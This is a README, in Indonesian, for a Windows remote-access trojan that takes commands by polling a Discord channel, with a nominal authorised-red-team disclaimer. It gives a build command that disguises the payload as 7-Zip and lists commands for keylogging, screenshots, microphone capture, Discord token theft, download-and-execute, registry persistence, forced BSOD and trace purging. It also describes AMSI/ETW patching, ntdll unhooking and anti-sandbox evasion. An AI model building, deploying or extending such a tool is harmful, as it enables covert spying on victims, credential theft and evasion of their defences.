# SysUpdate — payload PC

Payload Windows yang dikendalikan lewat channel Discord. Tanpa gateway, tanpa
`discord.py`, tanpa PyInstaller: REST murni + Nuitka/MSVC, satu exe, tanpa folder
`_MEI` yang diekstrak ke `%TEMP%`.

Untuk riset keamanan dan red-team yang diotorisasi. Jangan pakai ke mesin yang
bukan milik lu atau yang tidak lu punya izin tertulis untuk diuji.

## Cara kerja

```
mesin korban ──HTTPS polling 3 s──> Discord REST ──> channel
                                          ↑
                              !a <verb> dari akun operator
```

`net.py` memanggil `GET /channels/{id}/messages` tiap 3 detik. Perintah dibaca
dari prefix alias (`!a`) atau uuid, balasan dikirim balik sebagai pesan dengan
prefix `[a]`. Tidak ada websocket, jadi tidak ada pola koneksi gateway yang bisa
dijadikan signature.

## Build

```
builder.py --token <bot-token> --channel <id> --name payload.7z --alias a \
           --product "7-Zip" --company "Igor Pavlov" \
           --desc "7-Zip Archive" --version 24.9.0.0 \
           --icon dist\carrier\foto.ico --compiler msvc --low-memory \
           --out dist\_next
```

Butuh MSVC (`vcvars64.bat`) dan Nuitka. Token + channel dienkripsi ke
`core/config.py` saat build, jadi `strings payload.exe | findstr discord` balik
kosong.

| flag | keterangan |
|---|---|
| `--token` / `--channel` | kredensial bot, dienkripsi ke config |
| `--alias` | huruf prefix perintah, satu per mesin |
| `--product` / `--company` / `--desc` / `--version` | metadata PE supaya tidak jatuh ke "unknown" |
| `--icon` | ikon yang ikut dipasang |
| `--compiler` | `msvc` (Nuitka) atau `pyinstaller` untuk engine lama |
| `--low-memory` | satu job C, buat mesin ≤8 GB |
| `--out` | folder hasil; selalu diabsolutkan sebelum Nuitka dipanggil |

Hasil: `dist/_next/payload.7z.exe` + `payload.7z.json` (metadata build). Builder
menjalankan `leak_check` di akhir — token plaintext, nama modul, dan string
`discord` yang bocor menggagalkan build, bukan lolos diam-diam.

## Perintah

Daftar lengkap dengan hak akses dan batasnya ada di [`docs/commands.md`](docs/commands.md).
Ringkasnya 39 verb:

```
info sys ping sh pow x cd ls shot dl up clip keys ps kill taskkill
msg notify tts volume mic block rick wifi grab power admin bsod
persist unpersist update sleep exit purge
```

## Peta ke `truelockmc/Discord-RAT`

Repo itu jadi acuan fitur. Yang bisa dipindah 1:1 dipindah; yang tidak, diganti
padanan yang benar-benar jalan dan alasannya ditulis, bukan disembunyikan.

| fitur di repo acuan | di sini | catatan |
|---|---|---|
| shell, file, screenshot, clipboard, keylogger | `sh`, `dl`/`up`, `shot`, `clip`, `keys` | sama |
| info mesin | `info` / `sys` | ditambah latensi `ping` |
| PowerShell | `pow` | `-NoProfile -NonInteractive` |
| unduh + jalankan | `x <url>` | pid dilaporkan, tanpa admin |
| messagebox | `msg` | ditambah `notify` yang tidak blocking |
| text-to-speech | `tts` | SAPI lewat PowerShell |
| kontrol volume | `volume` | tombol sistem, karena tidak ada API absolut tanpa COM |
| **mic livestream ke voice channel** | `mic [detik]` | Discord tidak lagi mengizinkan bot kirim audio ke voice tanpa voice lib; diganti rekam → WAV → attachment |
| **channel purge** | `purge` | di repo acuan menghapus pesan channel; di sini menghapus jejak payload lalu keluar |
| **BSOD** | `bsod yes` | bugcheck sungguhan, dijaga argumen `yes` |
| **rickroll** | `rick [url]` | form borderless topmost; backend IE, jadi `.mp4` langsung yang jalan |
| token Discord | `grab` | DPAPI + AES-256-GCM, tanpa admin |
| screenshot semua monitor | `shot` | Pillow `ImageGrab(all_screens=True)` |
| persistensi | `persist` / `unpersist` | registry Run + salinan di `%LOCALAPPDATA%` |
| update jarak jauh | `update`, `update gh` | unduh, verifikasi sha256, timpa, relaunch |

## Kemampuan bertanda hak akses

- `block on|off` — `BlockInput` menolak proses non-elevated sejak Vista. Tanpa
  UAC hasilnya `[err] ditolak (butuh admin)`.
- `admin` — `ShellExecuteW runas`, memunculkan UAC, instance baru elevated.
- `bsod yes` — `NtRaiseHardError` dengan ResponseOption 6.

`grab` justru **tidak** butuh admin: kunci `Local State` dibuka lewat DPAPI
profil user yang sedang login, jadi cukup hak user biasa. Kalau payload jalan
sebagai akun lain (mis. SYSTEM), kunci itu tidak terbuka.

## Evasi

`core/evade.py` menangani permukaan yang paling mudah jadi deteksi: AMSI/ETW
patch, unhook `ntdll` dari salinan bersih, dan pengecekan sandbox (uptime,
jumlah proses, RAM). Semua opsional lewat flag, karena setiap patch menambah
jejak, bukan mengurangi.

## Struktur

```
builder.py            orkestrasi build + leak check
core/main.py          loop utama, polling, routing
core/net.py           transport Discord REST
core/cmd.py           router verb + HELP
core/caps.py          shell, screenshot, keylogger, clipboard, proses, persist
core/extra.py         ping, pow, x, power, admin, taskkill, wifi, tts, notify,
                      mic, block, volume, rick, bsod, grab, AES-256-GCM, DPAPI
core/update.py        update jarak jauh + verifikasi sha256
core/persist.py       autostart, salinan exe, purge
core/evade.py         AMSI/ETW, unhook, anti-sandbox
core/_crypt.py        enkripsi config
docs/                 perintah + mekanisme update
tools/                carrier, dropper, polyglot, LNK, selftest
```
